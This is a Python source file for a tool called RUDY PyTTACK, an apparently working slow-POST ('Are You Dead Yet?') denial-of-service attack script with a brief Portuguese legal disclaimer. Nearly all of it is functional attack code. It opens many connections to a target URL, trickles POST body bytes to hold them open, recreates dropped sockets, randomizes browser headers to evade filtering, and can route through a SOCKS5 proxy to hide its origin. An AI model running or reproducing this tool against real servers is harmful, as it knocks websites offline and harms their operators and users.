#!/usr/bin/env python3

"""
Tool           :  RUDY PyTTACK Tool
Author         :  Roberto Godoy                                   
Github         :  https://github.com/godoyrw                    
Version        :  1.1.0

Description    :  RUDY (Are You Dead Yet?) é uma ferramenta de ataque de negação de serviço (DoS) 
                  projetada para explorar e sobrecarregar a capacidade de resposta de servidores web, 
                  particularmente aqueles que têm vulnerabilidades relacionadas à forma como lidam com solicitações HTTP.

Disclaimer     :  No Brasil, práticas como ataques DoS são consideradas crimes cibernéticos de acordo com a Lei nº 12.737/2012, 
                  conhecida como Lei Carolina Dieckmann, e outras legislações pertinentes.                    
"""
import socket
import socks
import ssl
import argparse
import time
import random
import string
import urllib.parse
import sys


class Logger:
    """
    A class used to log messages with different levels of verbosity.

    Attributes
    ----------
    verbose : bool
        A flag indicating whether to print messages or not.

    Methods
    -------
    __init__(self, verbosity=False)
        Initializes the Logger with the given verbosity level.

    set_verbosity(self, verbosity)
        Sets the verbosity level of the Logger.

    log(self, message, file=sys.stdout)
        Prints the given message if verbosity is True.

    warn(self, message, file=sys.stderr)
        Prints a warning message with the given message.

    error(self, message, file=sys.stderr)
        Prints an error message with the given message.
    """

    def __init__(self, verbosity=False):
        """
        Initializes the Logger with the given verbosity level.

        Parameters
        ----------
        verbosity : bool, optional
            A flag indicating whether to print messages or not. Default is False.
        """
        self.verbose = verbosity

    def set_verbosity(self, verbosity):
        """
        Sets the verbosity level of the Logger.

        Parameters
        ----------
        verbosity : bool
            A flag indicating whether to print messages or not.
        """
        self.verbose = verbosity

    def log(self, message, file=sys.stdout):
        """
        Prints the given message if verbosity is True.

        Parameters
        ----------
        message : str
            The message to be printed.
        file : file-like object, optional
            The file-like object to print the message to. Default is sys.stdout.
        """
        if self.verbose:
            print(message, file=file)

    def warn(self, message, file=sys.stderr):
        """
        Prints a warning message with the given message.

        Parameters
        ----------
        message : str
            The warning message to be printed.
        file : file-like object, optional
            The file-like object to print the warning message to. Default is sys.stderr.
        """
        print(f"WARNING: {message}", file=file)

    def error(self, message, file=sys.stderr):
        """
        Prints an error message with the given message.

        Parameters
        ----------
        message : str
            The error message to be printed.
        file : file-like object, optional
            The file-like object to print the error message to. Default is sys.stderr.
        """
        print(f"ERROR: {message}", file=file)


def print_rudy():
    """
    Print the name and description of the RUDY PyTTACK tool.

    This function prints a welcome message and a brief description of the RUDY PyTTACK tool.
    It does not take any parameters and does not return any value.
    """
    print("RUDY PyTTACK Tool")
    print()

def init_socket(host, port, tls=False, timeout=5):
    """
    Initialize a socket connection, optionally using TLS.

    Parameters:
    host (str): The host to connect to.
    port (int): The port number to connect to.
    tls (bool, optional): Whether to use TLS for the connection. Default is False.
    timeout (int, optional): The timeout for the connection in seconds. Default is 5.

    Returns:
    sock (socket): The initialized socket connection.
    """
    sock = socks.socksocket()
    sock.settimeout(timeout)
    sock.connect((host, port))
    if tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock

def generate_http_req(method, path, headers, version="HTTP/1.1"):
    """
    Generate an HTTP request with the given method, path, headers, and version.

    Parameters:
    method (str): The HTTP method for the request (e.g., GET, POST, PUT, DELETE).
    path (str): The path for the request.
    headers (list): A list of strings representing the headers for the request.
    version (str): The HTTP version for the request (default is "HTTP/1.1").

    Returns:
    str: The generated HTTP request as a string.
    """
    http_req = f"{method} {path} {version}\r\n"
    http_req += "\r\n".join(headers) + "\r\n"
    return http_req


def parse_arguments():
    """
    Parse command-line arguments.

    This function uses argparse module to parse command-line arguments. It defines several optional arguments
    and a required argument for the target URL.

    Parameters:
    None

    Returns:
    argparse.Namespace: An object containing the parsed arguments.

    """
    parser = argparse.ArgumentParser(
        prog="rudy",
        description=(
            "RUDY (Are you dead yet?) Denial of Service attack implementation in Python."
        )
    )
    parser.add_argument("-s", "--sockets", default=150, type=int,
                        help="Number of sockets (connections) to use. Default is 150.")
    parser.add_argument("-t", "--time", default=10, type=float,
                        help="Period of time in seconds between rounds. Default is 10.")
    parser.add_argument("-b", "--bytes", default=1, type=int,
                        help="Number of bytes to send per round. Default is 1.")
    parser.add_argument("-l", "--length", default=64, type=int,
                        help="Content-Length value in HTTP POST request. Default is 64.")
    parser.add_argument("-x", "--proxy", 
                        help="Send requests through a SOCKS5 proxy, e.g: 127.0.0.1:1080")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Enable verbose output.")
    parser.add_argument("--version", action="version", version="%(prog)s version 1.1")
    parser.add_argument("url", help='Absolute path to website, i.e [http[s]://]host[:port][file_path]')
    return parser.parse_args()


def get_user_agent():
    """Return a random User-Agent header."""
    user_agents = [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
      "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
      "User-Agent: Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
      "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
      "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
      "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
      "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
      "User-Agent: Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
      "User-Agent: Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
      "User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.66.18) Gecko/20177177 Firefox/45.66.18",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0",
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
      "User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
      "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
      "User-Agent: Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0",
      "User-Agent: Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0",
      "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0",
      "User-Agent: Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0",
      "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
      "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
      "User-Agent: Mozilla/5.0 (X11; Ubuntu i686; rv:52.0) Gecko/20100101 Firefox/52.0",
      "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
      "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
      "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
      "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
      "User-Agent: Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
      "User-Agent: Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0"
    ]
    return f"User-Agent: {random.choice(user_agents)}"


def get_accept_header():
    """Return a random Accept header."""
    accept_headers = [
         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,image/jxr,*/*"
        # Add more Accept headers as needed
    ]
    return f"Accept: {random.choice(accept_headers)}"


def get_accept_encoding_header():
    """Return a random Accept-Encoding header."""
    accept_encodings = [
        "gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, compress, br",
         "Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
         "Accept-Encoding: gzip,deflate,sdch",
         "Accept-Encoding: *"
        # Add more Accept-Encoding headers as needed
    ]
    return f"Accept-Encoding: {random.choice(accept_encodings)}"


def get_accept_language_header():
    """Return a random Accept-Language header."""
    accept_languages = [
        "en-US,en;q=0.5",
         "zh-CN,zh;q=0.8",
         "pt-BR,pt,q=0.5",
         "es-MX,es,q=0.5",
        # Add more Accept-Language headers as needed
    ]
    return f"Accept-Language: {random.choice(accept_languages)}"


def main():
    """
    This function is the main entry point for the HTTP POST flood attack script.
    It parses command-line arguments, initializes sockets, and sends HTTP POST requests to the target server.

    Parameters:
    None

    Returns:
    None
    """
    try:
        args = parse_arguments()
        url = urllib.parse.urlparse(args.url)
        host = url.netloc
        file_path = url.path or "/"
        port = 443 if url.scheme == "https" else 80
        tls = url.scheme == "https"
        proxy = args.proxy
        logger = Logger(args.verbose)

        if ":" in host:
            host, port = host.split(":")
            port = int(port)

        if proxy:
            try:
                proxy_host, proxy_port = proxy.split(":")
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, int(proxy_port), True)
            except ValueError:
                logger.error("Invalid format for proxy address.")
                sys.exit(1)

        print_rudy()
        if proxy:
            print(f"Using proxy: {proxy}")

        socket_count = args.sockets
        round_time = args.time
        bytes_per_round = args.bytes
        content_length = args.length

        sockets = []
        ascii_chars = string.digits + string.ascii_letters
        host_header = f"Host: {host}"
        default_headers = [
            "Connection: keep-alive",
            "Cache-Control: max-age=0",
            f"Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {content_length}"
        ]

        print(f"Attacking {host} with {socket_count} sockets.")
        print("Creating sockets...")

        for i in range(socket_count):
            try:
                logger.log(f"Creating socket number {i + 1}")
                sock = init_socket(host, port, tls)
                headers = [
                    host_header,
                    get_user_agent(),
                    get_accept_header(),
                    get_accept_encoding_header(),
                    get_accept_language_header()
                ] + default_headers
                http_request = generate_http_req("POST", file_path, headers)
                sock.sendall(http_request.encode("utf-8"))
                sockets.append(sock)
            except socket.error as e:
                logger.error(f"Socket error: {e}")
                break

        while True:
            if bytes_per_round == 1:
                print(f"Sending byte in HTTP POST body... Socket count: {len(sockets)}")
            else:
                print(f"Sending bytes in HTTP POST body... Socket count: {len(sockets)}")

            for sock in list(sockets):
                try:
                    msg = ''.join(random.choice(ascii_chars) for _ in range(bytes_per_round))
                    sock.send(msg.encode("utf-8"))
                except socket.error:
                    sockets.remove(sock)

            while len(sockets) < socket_count:
                try:
                    logger.log("Recreating socket...")
                    sock = init_socket(host, port, tls)
                    headers = [
                        host_header,
                        get_user_agent(),
                        get_accept_header(),
                        get_accept_encoding_header(),
                        get_accept_language_header()
                    ] + default_headers
                    http_request = generate_http_req("POST", file_path, headers)
                    sock.sendall(http_request.encode("utf-8"))
                    sockets.append(sock)
                except socket.error as e:
                    logger.error(f"Socket error during recreation: {e}")
                    break

            time.sleep(round_time)

    except KeyboardInterrupt:
        print("\nInterrupted by user.")


if(__name__ == '__main__'):
    """
    Entry point of the application.
    """
    main()
    